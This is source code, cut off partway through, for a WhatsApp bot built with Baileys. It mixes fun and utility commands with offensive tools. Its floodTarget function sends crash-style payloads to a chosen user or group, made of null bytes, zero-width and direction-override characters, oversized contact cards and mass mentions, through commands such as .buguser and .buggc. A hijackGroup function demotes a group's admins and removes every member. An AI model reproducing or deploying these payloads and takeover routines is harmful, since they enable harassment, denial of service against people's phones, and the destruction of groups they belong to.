const { makeWASocket, useMultiFileAuthState, downloadMediaMessage } = require('@whiskeysockets/baileys')
const http = require('http')
const pino = require('pino')
const axios = require('axios')
const fs = require('fs')

// ======= CONFIG =======
const OWNER_NUMBER = '2348145688688'
const OWNER = OWNER_NUMBER + '@s.whatsapp.net'
const OWNER_NAME = 'TAVIK(GODSWILL)'
const BOT_NAME = 'TAVIK BOT'
const BOT_VERSION = 'V1.0'
const UNSPLASH_KEY = 'YOUR_NEW_UNSPLASH_KEY' // 🔁 Replace with your new key

// Free AI - Using pollinations.ai (no key needed)
const AI_API = 'https://text.pollinations.ai/'

let sudoUsers = []
let floodActive = {}
let antiDelete = {}
let autoreply = {}
let antibadword = {}
let autoread = false
let autoreact = false
let autotyping = false

// Bad words list
const BAD_WORDS = ['fuck', 'shit', 'bitch', 'bastard', 'idiot', 'stupid']

// ======= UPTIME =======
const startTime = Date.now()
function getUptime() {
    const s = Math.floor((Date.now() - startTime) / 1000)
    const mins = Math.floor(s / 60)
    const secs = s % 60
    const hrs = Math.floor(mins / 60)
    const remainMins = mins % 60
    if (hrs > 0) return `${hrs}h ${remainMins}m ${secs}s`
    if (mins > 0) return `${mins}m ${secs}s`
    return `${secs}s`
}

// ======= MENU =======
function getMenu(username) {
    return `━━━━━( ${BOT_NAME} ${BOT_VERSION} )━━━━━
┏━━━━━━━━━━━━━─────────────╮
│ 👤 ᴜsᴇʀ     : ${username}
│ ⏳ ᴜᴘᴛɪᴍᴇ   : ${getUptime()}
│ 🔐 ᴍᴏᴅᴇ     : Public 🔓
│ ✍️ ᴏᴡɴᴇʀ    : ${OWNER_NAME}
╰──────────────────────────╯
Hi ${username} 👋

┌─〔 Owner Commands 〕
│▧ .owner      │▧ .alive
│▧ .ping       │▧ .credits
│▧ .addsudo    │▧ .delsudo
│▧ .sudolist   │▧ .sudo
│▧ .buguser    │▧ .buggc
│▧ .stopflood  │▧ .hijack
│▧ .block      │▧ .unblock
│▧ .setstatus
└──────────────────────────

┌─〔 Group Commands 〕
│▧ .hidetag    │▧ .tagall
│▧ .kick       │▧ .promote
│▧ .demote     │▧ .mute
│▧ .unmute     │▧ .gcinfo
│▧ .kickall    │▧ .add
│▧ .resetlink  │▧ .grouplink
│▧ .setgcname  │▧ .listadmins
│▧ .antilink   │▧ .antispam
└──────────────────────────

┌─〔 AI & Tools 〕
│▧ .tavik-ai   │▧ .ai
│▧ .pint       │▧ .upscale
│▧ .wiki       │▧ .weather
│▧ .calculate  │▧ .time
│▧ .currency   │▧ .dictionary
│▧ .translate  │▧ .qrcode
└──────────────────────────

┌─〔 Download 〕
│▧ .tosticker  │▧ .toimg
│▧ .tomp3      │▧ .tomp4
│▧ .tiktok     │▧ .ytsearch
│▧ .savestatus │▧ .save
└──────────────────────────

┌─〔 Fun & Games 〕
│▧ .dice       │▧ .coin
│▧ .joke       │▧ .8ball
│▧ .truth      │▧ .dare
│▧ .meme       │▧ .funfact
│▧ .roast      │▧ .compliment
│▧ .quote      │▧ .dadjoke
│▧ .advice
└──────────────────────────

┌─〔 Sticker & Reactions 〕
│▧ .cry  .hug  .slap  .pat
│▧ .wink .dance .bonk .bite
│▧ .cuddle .blush .wave
└──────────────────────────

┌─〔 Media Tools 〕
│▧ .autoreply on/off
│▧ .antidelete on/off
│▧ .antibadword on/off
│▧ .autoread on/off
│▧ .autoreact on/off
│▧ .autotyping on/off
└──────────────────────────

╔══════════════════════════╗
║   🤖 ${BOT_NAME} ${BOT_VERSION}       ║
║   👑 Owner: ${OWNER_NAME}   ║
║   ⚡ Powered by TAVIK TECH ║
║   🛡️ Built with ❤️ by      ║
║      GODSWILL (TAVIK)      ║
╚══════════════════════════╝`
}

// ======= AI FUNCTION (Free - No key needed) =======
async function askAI(prompt) {
    try {
        const res = await axios.get(`${AI_API}${encodeURIComponent(prompt)}`, {
            timeout: 30000,
            headers: { 'Accept': 'text/plain' }
        })
        return res.data || 'No response from AI.'
    } catch (e) {
        return '❌ AI is busy. Try again later!'
    }
}

// ======= SEARCH IMAGE =======
async function searchImage(query) {
    try {
        const res = await axios.get('https://api.unsplash.com/search/photos', {
            params: { query, per_page: 1 },
            headers: { Authorization: `Client-ID ${UNSPLASH_KEY}` }
        })
        const results = res.data.results
        if (!results || results.length === 0) return null
        return results[0].urls.regular
    } catch (e) {
        return `https://source.unsplash.com/800x600/?${encodeURIComponent(query)}`
    }
}

// ======= DOWNLOAD BUFFER =======
async function downloadBuffer(url) {
    try {
        const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 20000 })
        return Buffer.from(res.data)
    } catch (e) { return null }
}

// ======= UPSCALE IMAGE =======
async function upscaleImage(buffer) {
    try {
        const FormData = require('form-data')
        const form = new FormData()
        form.append('image', buffer, { filename: 'image.jpg', contentType: 'image/jpeg' })
        const res = await axios.post('https://api.deepai.org/api/torch-srgan', form, {
            headers: { ...form.getHeaders(), 'api-key': 'quickstart-QUdJIGlzIGZ1bg' },
            timeout: 30000
        })
        const url = res.data?.output_url
        if (!url) return null
        return await downloadBuffer(url)
    } catch (e) { return null }
}

// ======= WEATHER =======
async function getWeather(city) {
    try {
        const res = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=4`, { timeout: 10000 })
        return res.data
    } catch (e) { return null }
}

// ======= WIKIPEDIA =======
async function getWiki(query) {
    try {
        const res = await axios.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`, { timeout: 10000 })
        return res.data.extract || null
    } catch (e) { return null }
}

// ======= JOKE =======
async function getJoke() {
    try {
        const res = await axios.get('https://v2.jokeapi.dev/joke/Any?blacklistFlags=nsfw,racist&type=single', { timeout: 10000 })
        return res.data.joke || null
    } catch (e) { return '😂 Why did the bot cross the road? To get to the other side!' }
}

// ======= FUN FACT =======
async function getFunFact() {
    try {
        const res = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en', { timeout: 10000 })
        return res.data.text || null
    } catch (e) { return '🤔 Did you know? TAVIK BOT is the best bot ever!' }
}

// ======= ADVICE =======
async function getAdvice() {
    try {
        const res = await axios.get('https://api.adviceslip.com/advice', { timeout: 10000 })
        return res.data.slip.advice || null
    } catch (e) { return '💡 Always be yourself!' }
}

// ======= QUOTE =======
async function getQuote() {
    try {
        const res = await axios.get('https://api.quotable.io/random', { timeout: 10000 })
        return `"${res.data.content}" - ${res.data.author}` || null
    } catch (e) { return '"Success is not final, failure is not fatal." - Winston Churchill' }
}

// ======= FLOOD =======
async function floodTarget(sock, jid, count = 200) {
    floodActive[jid] = true
    const payloads = [
        () => ({ text: '\u0000'.repeat(5000) + '꧔ꦿ'.repeat(2000) }),
        () => ({
            contacts: {
                displayName: '​'.repeat(3000),
                contacts: Array(150).fill({
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'​'.repeat(800)}\nTEL:+${'9'.repeat(300)}\nEND:VCARD`
                })
            }
        }),
        () => ({ text: '᷂᷿᷄᷾'.repeat(3000) + '\u202E'.repeat(2000) }),
        () => ({ text: '\u200B\u200C\u200D\uFEFF'.repeat(4000) }),
        () => ({ text: '𒐫'.repeat(4000) + '\u0000'.repeat(1000) }),
        () => ({ text: '@0000000000 '.repeat(500), mentions: Array(500).fill('0000000000@s.whatsapp.net') }),
        () => ({ text: '🔥💥⚡🌀'.repeat(3000) }),
        () => ({ text: '\u202E' + 'TAVIK'.repeat(2000) + '\u202C'.repeat(2000) })
    ]
    let sent = 0
    while (floodActive[jid] && sent < count) {
        try {
            await sock.sendMessage(jid, payloads[sent % payloads.length]())
            if (sent % 5 !== 0) await new Promise(r => setTimeout(r, 100))
            sent++
        } catch (e) { await new Promise(r => setTimeout(r, 200)) }
    }
    floodActive[jid] = false
    return sent
}

function stopFlood(jid) { floodActive[jid] = false }

// ======= HIJACK =======
async function hijackGroup(sock, jid) {
    try {
        const meta = await sock.groupMetadata(jid)
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'
        const admins = meta.participants.filter(p => p.admin && p.id !== botId).map(p => p.id)
        const members = meta.participants.filter(p => p.id !== botId).map(p => p.id)
        try { await sock.groupParticipantsUpdate(jid, [botId], 'promote') } catch (e) {}
        if (admins.length > 0) await sock.groupParticipantsUpdate(jid, admins, 'demote').catch(() => {})
        const chunks = []
        for (let i = 0; i < members.length; i += 5) chunks.push(members.slice(i, i + 5))
        for (const chunk of chunks) {
            await sock.groupParticipantsUpdate(jid, chunk, 'remove').catch(() => {})
            await new Promise(r => setTimeout(r, 500))
        }
        await sock.sendMessage(jid, { text: `⚡ *${BOT_NAME}* has taken over!\n👑 Now owned by ${OWNER_NAME}` })
        return true
    } catch (e) { return false }
}

// ======= REACTIONS =======
const reactions = {
    cry: '😢', hug: '🤗', slap: '👋', pat: '🫶',
    wink: '😉', dance: '💃', bonk: '🔨', bite: '😬',
    cuddle: '🥰', blush: '😊', wave: '👋', smile: '😊',
    laugh: '😂', angry: '😤', love: '❤️', cool: '😎'
}

// ======= TRUTH & DARE =======
const truths = [
    'What is your biggest fear?',
    'Have you ever lied to your best friend?',
    'What is your most embarrassing moment?',
    'Do you have a crush on anyone?',
    'What is the worst thing you have ever done?'
]

const dares = [
    'Send a voice note singing a song!',
    'Change your WhatsApp status to "I love TAVIK BOT" for 1 hour!',
    'Send a funny selfie!',
    'Text someone you haven\'t talked to in a year!',
    'Do 10 pushups and send proof!'
]

// ======= 8BALL =======
const eightBallAnswers = [
    '✅ Yes, definitely!', '✅ Without a doubt!', '✅ Most likely!',
    '⚠️ Maybe...', '⚠️ Ask again later', '⚠️ Cannot predict now',
    '❌ Don\'t count on it', '❌ Very doubtful', '❌ Definitely not!'
]

// ======= MAIN BOT =======
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info')

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' })
    })

    sock.ev.on('creds.update', saveCreds)

    // ======= AUTO PAIRING (keeps refreshing every 50 seconds) =======
    if (!sock.authState.creds.registered) {
        const number = '2348145688688'
        
        const showCode = async () => {
            try {
                const code = await sock.requestPairingCode(number)
                console.log(`\n🔑 TAVIK BOT Pairing Code: ${code}`)
                console.log(`⏳ Code refreshes in 50 seconds...\n`)
            } catch (e) {
                console.log('Pairing code error:', e.message)
            }
        }

        // Show first code after 5 seconds
        setTimeout(showCode, 5000)

        // Keep refreshing every 50 seconds
        setInterval(async () => {
            if (!sock.authState.creds.registered) {
                await showCode()
            }
        }, 50000)
    }

    // ======= ANTI DELETE =======
    sock.ev.on('messages.delete', async (item) => {
        try {
            if (!item.keys) return
            for (const key of item.keys) {
                const jid = key.remoteJid
                if (antiDelete[jid] && antiDelete[jid].enabled) {
                    // notify owner
                    await sock.sendMessage(OWNER, {
                        text: `🗑️ *Anti-Delete Alert!*\nA message was deleted in: ${jid}\nBy: ${key.participant || jid}`
                    })
                }
            }
        } catch (e) {}
    })

    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0]
            if (!msg.message) return

            const from = msg.key.remoteJid
            const sender = msg.key.participant || msg.key.remoteJid
            const senderNumber = sender.split('@')[0]
            const isOwner = sender === OWNER
            const isSudo = sudoUsers.includes(senderNumber)
            const isPrivileged = isOwner || isSudo
            const isGroup = from.endsWith('@g.us')
            const pushName = msg.pushName || 'User'

            const text = msg.message?.conversation ||
                         msg.message?.extendedTextMessage?.text || ''
            const args = text.trim().split(' ')
            const cmd = args[0].toLowerCase()
            const query = args.slice(1).join(' ')

            // ======= AUTO READ =======
            if (autoread) await sock.readMessages([msg.key])

            // ======= AUTO REACT =======
            if (autoreact && text) {
                const emojis = ['❤️', '😂', '🔥', '⚡', '👍', '🎉']
                await sock.sendMessage(from, {
                    react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: msg.key }
                })
            }

            // ======= AUTO TYPING =======
            if (autotyping && text) {
                await sock.sendPresenceUpdate('composing', from)
                await new Promise(r => setTimeout(r, 1000))
                await sock.sendPresenceUpdate('paused', from)
            }

            // ======= ANTI BAD WORD =======
            if (isGroup && antibadword[from]) {
                const hasBadWord = BAD_WORDS.some(w => text.toLowerCase().includes(w))
                if (hasBadWord && !isPrivileged) {
                    await sock.sendMessage(from, {
                        delete: msg.key
                    })
                    await sock.sendMessage(from, {
                        text: `⚠️ @${senderNumber} Watch your language!`,
                        mentions: [sender]
                    })
                    return
                }
            }

            // ======= AUTO REPLY =======
            if (autoreply[from] && text && !text.startsWith('.')) {
                const aiReply = await askAI(text)
                await sock.sendMessage(from, { text: aiReply }, { quoted: msg })
                return
            }

            if (!text.startsWith('.')) return

            // ===== MENU =====
            if (cmd === '.menu') {
                await sock.sendMessage(from, { text: getMenu(pushName) }, { quoted: msg })
            }

            // ===== ALIVE =====
            else if (cmd === '.alive') {
                await sock.sendMessage(from, {
                    text: `╔══════════════════╗\n║  ✅ BOT IS ALIVE!  ║\n╚══════════════════╝\n\n🤖 *${BOT_NAME} ${BOT_VERSION}*\n⏳ Uptime: ${getUptime()}\n👑 Owner: ${OWNER_NAME}\n⚡ Status: Online 🟢`
                }, { quoted: msg })
            }

            // ===== PING =====
            else if (cmd === '.ping') {
                const t = Date.now()
                await sock.sendMessage(from, { text: `🏓 Pong!\n⚡ Speed: ${Date.now() - t}ms` }, { quoted: msg })
            }

            // ===== CREDITS =====
            else if (cmd === '.credits') {
                await sock.sendMessage(from, {
                    text: `╔══════════════════════╗\n║  🏆 TAVIK BOT CREDITS  ║\n╚══════════════════════╝\n\n👑 Developer: GODSWILL (TAVIK)\n🤖 Bot: ${BOT_NAME} ${BOT_VERSION}\n⚡ Engine: Baileys + Node.js\n🌍 Host: Railway (TAVIK TECH)\n💎 Built with ❤️ by TAVIK(GODSWILL)\n\n🙏 Thanks for using ${BOT_NAME}!`
                }, { quoted: msg })
            }

            // ===== OWNER =====
            else if (cmd === '.owner') {
                await sock.sendMessage(from, {
                    text: `👑 *BOT OWNER*\n\n📛 Name: ${OWNER_NAME}\n📱 Number: wa.me/${OWNER_NUMBER}\n⚡ Brand: TAVIK TECH\n🤖 Bot: ${BOT_NAME} ${BOT_VERSION}`
                }, { quoted: msg })
            }

            // ===== TAVIK-AI & AI =====
            else if (cmd === '.tavik-ai' || cmd === '.ai') {
                if (!query) return sock.sendMessage(from, {
                    text: `🤖 *TAVIK AI*\n\nUsage: ${cmd} <your question>\n\nExample:\n${cmd} What is artificial intelligence?\n${cmd} Write me a poem\n${cmd} Help me code in Python`
                }, { quoted: msg })

                await sock.sendMessage(from, { text: '🤖 TAVIK AI is thinking...' }, { quoted: msg })
                const response = await askAI(query)
                await sock.sendMessage(from, {
                    text: `🤖 *TAVIK AI*\n\n${response}\n\n━━━━━━━━━━━━━━\n⚡ Powered by ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== PINT - Search Image =====
            else if (cmd === '.pint') {
                if (!query) return sock.sendMessage(from, {
                    text: '❌ Usage: .pint <search>\nExample: .pint sunset beach'
                }, { quoted: msg })
                await sock.sendMessage(from, { text: `🔍 Searching *${query}*...` }, { quoted: msg })
                const url = await searchImage(query)
                if (!url) return sock.sendMessage(from, { text: '❌ No image found!' }, { quoted: msg })
                const buf = await downloadBuffer(url)
                if (!buf) return sock.sendMessage(from, { text: '❌ Failed to load image!' }, { quoted: msg })
                await sock.sendMessage(from, {
                    image: buf,
                    caption: `🖼️ *${query}*\n⚡ ${BOT_NAME} | ${OWNER_NAME}`
                }, { quoted: msg })
            }

            // ===== UPSCALE =====
            else if (cmd === '.upscale') {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
                const imageMsg = quoted?.imageMessage || msg.message?.imageMessage
                if (!imageMsg) return sock.sendMessage(from, {
                    text: '❌ Reply to an image with .upscale'
                }, { quoted: msg })
                await sock.sendMessage(from, { text: '🔧 Enhancing image... ⏳' }, { quoted: msg })
                const buffer = await downloadMediaMessage(
                    { message: quoted ? { imageMessage: imageMsg } : msg.message, key: msg.key },
                    'buffer', {}
                )
                const upscaled = await upscaleImage(buffer)
                if (!upscaled) return sock.sendMessage(from, { text: '❌ Upscale failed! Try again.' }, { quoted: msg })
                await sock.sendMessage(from, {
                    image: upscaled,
                    caption: `✅ *Enhanced 2x!*\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== WIKI =====
            else if (cmd === '.wiki') {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .wiki <topic>' }, { quoted: msg })
                await sock.sendMessage(from, { text: `🔍 Searching Wikipedia for *${query}*...` }, { quoted: msg })
                const result = await getWiki(query)
                if (!result) return sock.sendMessage(from, { text: '❌ Nothing found!' }, { quoted: msg })
                await sock.sendMessage(from, {
                    text: `📖 *Wikipedia: ${query}*\n\n${result}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== WEATHER =====
            else if (cmd === '.weather') {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .weather <city>' }, { quoted: msg })
                const result = await getWeather(query)
                if (!result) return sock.sendMessage(from, { text: '❌ City not found!' }, { quoted: msg })
                await sock.sendMessage(from, {
                    text: `🌤️ *Weather: ${query}*\n\n${result}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== CALCULATE =====
            else if (cmd === '.calculate' || cmd === '.calc') {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .calculate 5+5' }, { quoted: msg })
                try {
                    const result = eval(query.replace(/[^0-9+\-*/.()%]/g, ''))
                    await sock.sendMessage(from, {
                        text: `🧮 *Calculator*\n\n📝 ${query}\n✅ = ${result}\n\n⚡ ${BOT_NAME}`
                    }, { quoted: msg })
                } catch (e) {
                    await sock.sendMessage(from, { text: '❌ Invalid calculation!' }, { quoted: msg })
                }
            }

            // ===== TIME =====
            else if (cmd === '.time') {
                const now = new Date()
                await sock.sendMessage(from, {
                    text: `🕐 *Current Time*\n\n📅 Date: ${now.toDateString()}\n⏰ Time: ${now.toTimeString().split(' ')[0]}\n🌍 UTC: ${now.toUTCString()}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== JOKE =====
            else if (cmd === '.joke' || cmd === '.dadjoke') {
                const joke = await getJoke()
                await sock.sendMessage(from, {
                    text: `😂 *Joke Time!*\n\n${joke}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== FUNFACT =====
            else if (cmd === '.funfact') {
                const fact = await getFunFact()
                await sock.sendMessage(from, {
                    text: `🤔 *Fun Fact!*\n\n${fact}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== ADVICE =====
            else if (cmd === '.advice') {
                const adv = await getAdvice()
                await sock.sendMessage(from, {
                    text: `💡 *Advice!*\n\n${adv}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== QUOTE =====
            else if (cmd === '.quote') {
                const q = await getQuote()
                await sock.sendMessage(from, {
                    text: `💬 *Quote of the Day*\n\n${q}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== DICE =====
            else if (cmd === '.dice') {
                const roll = Math.floor(Math.random() * 6) + 1
                await sock.sendMessage(from, {
                    text: `🎲 *Dice Roll!*\n\nYou rolled: *${roll}*\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== COIN =====
            else if (cmd === '.coin') {
                const flip = Math.random() > 0.5 ? 'Heads 🪙' : 'Tails 🪙'
                await sock.sendMessage(from, {
                    text: `🪙 *Coin Flip!*\n\nResult: *${flip}*\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== 8BALL =====
            else if (cmd === '.8ball') {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .8ball <question>' }, { quoted: msg })
                const answer = eightBallAnswers[Math.floor(Math.random() * eightBallAnswers.length)]
                await sock.sendMessage(from, {
                    text: `🎱 *Magic 8 Ball*\n\n❓ ${query}\n\n${answer}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== TRUTH =====
            else if (cmd === '.truth') {
                const t = truths[Math.floor(Math.random() * truths.length)]
                await sock.sendMessage(from, {
                    text: `🤫 *Truth!*\n\n${t}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== DARE =====
            else if (cmd === '.dare') {
                const d = dares[Math.floor(Math.random() * dares.length)]
                await sock.sendMessage(from, {
                    text: `😈 *Dare!*\n\n${d}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== ROAST =====
            else if (cmd === '.roast') {
                const roasts = [
                    'You are the reason why instructions exist on shampoo bottles.',
                    'I would agree with you but then we would both be wrong.',
                    'You bring everyone so much joy when you leave the room.',
                    'I have seen better heads on a glass of beer.',
                    'You are like a cloud — when you disappear, it is a beautiful day!'
                ]
                const target = args[1] ? `@${args[1].replace('@', '')}` : pushName
                await sock.sendMessage(from, {
                    text: `🔥 *Roast for ${target}*\n\n${roasts[Math.floor(Math.random() * roasts.length)]}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== COMPLIMENT =====
            else if (cmd === '.compliment') {
                const compliments = [
                    'You have a great sense of humor!',
                    'You are an amazing person!',
                    'You light up every room you walk into!',
                    'You are stronger than you think!',
                    'The world is a better place with you in it!'
                ]
                const target = args[1] ? `@${args[1].replace('@', '')}` : pushName
                await sock.sendMessage(from, {
                    text: `💝 *Compliment for ${target}*\n\n${compliments[Math.floor(Math.random() * compliments.length)]}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== REACTIONS =====
            else if (reactions[cmd.slice(1)]) {
                const emoji = reactions[cmd.slice(1)]
                const target = args[1] ? args[1] : pushName
                await sock.sendMessage(from, {
                    text: `${emoji} *${pushName}* ${cmd.slice(1)}s *${target}*! ${emoji}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== SUDO COMMANDS =====
            else if (cmd === '.addsudo' && isOwner) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .addsudo number\nOr reply to message' }, { quoted: msg })
                if (sudoUsers.includes(target)) return sock.sendMessage(from, { text: `⚠️ Already sudo!` }, { quoted: msg })
                sudoUsers.push(target)
                await sock.sendMessage(from, {
                    text: `✅ *${target}* is now sudo!\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            else if (cmd === '.delsudo' && isOwner) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                sudoUsers = sudoUsers.filter(n => n !== target)
                await sock.sendMessage(from, { text: `✅ ${target} removed from sudo!` }, { quoted: msg })
            }

            else if (cmd === '.sudolist') {
                if (!sudoUsers.length) return sock.sendMessage(from, { text: '📋 No sudo users yet.' }, { quoted: msg })
                await sock.sendMessage(from, {
                    text: `👥 *Sudo Users:*\n\n${sudoUsers.map((n, i) => `${i + 1}. wa.me/${n}`).join('\n')}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            else if (cmd === '.sudo') {
                if (!isPrivileged) return sock.sendMessage(from, {
                    text: `❌ You are not a sudo user!\nContact owner: wa.me/${OWNER_NUMBER}`
                }, { quoted: msg })
                await sock.sendMessage(from, {
                    text: `✅ *Sudo Access Confirmed!*\n\n👤 User: ${pushName}\n🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            // ===== BLOCK =====
            else if (cmd === '.block' && isOwner) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .block number' }, { quoted: msg })
                await sock.updateBlockStatus(target + '@s.whatsapp.net', 'block')
                await sock.sendMessage(from, { text: `✅ ${target} blocked!` }, { quoted: msg })
            }

            // ===== UNBLOCK =====
            else if (cmd === '.unblock' && isOwner) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .unblock number' }, { quoted: msg })
                await sock.updateBlockStatus(target + '@s.whatsapp.net', 'unblock')
                await sock.sendMessage(from, { text: `✅ ${target} unblocked!` }, { quoted: msg })
            }

            // ===== SETSTATUS =====
            else if (cmd === '.setstatus' && isOwner) {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .setstatus <text>' }, { quoted: msg })
                await sock.updateProfileStatus(query)
                await sock.sendMessage(from, { text: `✅ Status updated to: ${query}` }, { quoted: msg })
            }

            // ===== BUG USER =====
            else if (cmd === '.buguser' && isPrivileged) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .buguser number [count]' }, { quoted: msg })
                const count = parseInt(args[2]) || 200
                await sock.sendMessage(from, { text: `🐛 Flooding ${target}...` }, { quoted: msg })
                const sent = await floodTarget(sock, target + '@s.whatsapp.net', count)
                await sock.sendMessage(from, { text: `✅ Sent ${sent} messages to ${target}` }, { quoted: msg })
            }

            // ===== BUG GC =====
            else if (cmd === '.buggc' && isPrivileged) {
                if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' }, { quoted: msg })
                const count = parseInt(args[1]) || 200
                await sock.sendMessage(from, { text: `🐛 Flooding group...` }, { quoted: msg })
                const sent = await floodTarget(sock, from, count)
                await sock.sendMessage(from, { text: `✅ Sent ${sent} messages!` }, { quoted: msg })
            }

            // ===== STOP FLOOD =====
            else if (cmd === '.stopflood' && isPrivileged) {
                const target = args[1]?.replace(/[^0-9]/g, '')
                stopFlood(target ? target + '@s.whatsapp.net' : from)
                await sock.sendMessage(from, { text: '🛑 Flood stopped!' }, { quoted: msg })
            }

            // ===== HIJACK =====
            else if (cmd === '.hijack' && isOwner) {
                if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' }, { quoted: msg })
                await sock.sendMessage(from, { text: '⚡ Hijacking...' }, { quoted: msg })
                const result = await hijackGroup(sock, from)
                if (!result) await sock.sendMessage(from, { text: '❌ Failed!' }, { quoted: msg })
            }

            // ===== GROUP COMMANDS =====
            else if (cmd === '.tagall' && isGroup) {
                const meta = await sock.groupMetadata(from)
                const members = meta.participants.map(p => p.id)
                const text = members.map(m => `@${m.split('@')[0]}`).join(' ')
                await sock.sendMessage(from, {
                    text: `📢 *Attention Everyone!*\n\n${query || 'Check this out!'}\n\n${text}`,
                    mentions: members
                }, { quoted: msg })
            }

            else if (cmd === '.hidetag' && isGroup && isPrivileged) {
                const meta = await sock.groupMetadata(from)
                const members = meta.participants.map(p => p.id)
                await sock.sendMessage(from, {
                    text: query || '📢 Hidden tag!',
                    mentions: members
                })
            }

            else if (cmd === '.kick' && isGroup && isPrivileged) {
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                let target = args[1]?.replace(/[^0-9]/g, '')
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Reply to a message or mention someone!' }, { quoted: msg })
                await sock.groupParticipantsUpdate(from, [target + '@s.whatsapp.net'], 'remove')
                await sock.sendMessage(from, { text: `✅ ${target} kicked!` }, { quoted: msg })
            }

            else if (cmd === '.promote' && isGroup && isPrivileged) {
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                let target = args[1]?.replace(/[^0-9]/g, '')
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Reply or mention someone!' }, { quoted: msg })
                await sock.groupParticipantsUpdate(from, [target + '@s.whatsapp.net'], 'promote')
                await sock.sendMessage(from, { text: `✅ ${target} promoted to admin!` }, { quoted: msg })
            }

            else if (cmd === '.demote' && isGroup && isPrivileged) {
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                let target = args[1]?.replace(/[^0-9]/g, '')
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Reply or mention someone!' }, { quoted: msg })
                await sock.groupParticipantsUpdate(from, [target + '@s.whatsapp.net'], 'demote')
                await sock.sendMessage(from, { text: `✅ ${target} demoted!` }, { quoted: msg })
            }

            else if (cmd === '.mute' && isGroup && isPrivileged) {
                await sock.groupSettingUpdate(from, 'announcement')
                await sock.sendMessage(from, { text: '🔇 Group muted! Only admins can send messages.' }, { quoted: msg })
            }

            else if (cmd === '.unmute' && isGroup && isPrivileged) {
                await sock.groupSettingUpdate(from, 'not_announcement')
                await sock.sendMessage(from, { text: '🔊 Group unmuted! Everyone can send messages.' }, { quoted: msg })
            }

            else if (cmd === '.gcinfo' && isGroup) {
                const meta = await sock.groupMetadata(from)
                const admins = meta.participants.filter(p => p.admin).length
                await sock.sendMessage(from, {
                    text: `📊 *Group Info*\n\n📛 Name: ${meta.subject}\n👥 Members: ${meta.participants.length}\n👑 Admins: ${admins}\n🆔 JID: ${from}\n📅 Created: ${new Date(meta.creation * 1000).toDateString()}\n\n⚡ ${BOT_NAME}`
                }, { quoted: msg })
            }

            else if (cmd === '.kickall' && isGroup && isOwner) {
                const meta = await sock.groupMetadata(from)
                const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'
                const members = meta.participants.filter(p => !p.admin && p.id !== botId).map(p => p.id)
                await sock.sendMessage(from, { text: `⚡ Kicking ${members.length} members...` }, { quoted: msg })
                for (let i = 0; i < members.length; i += 5) {
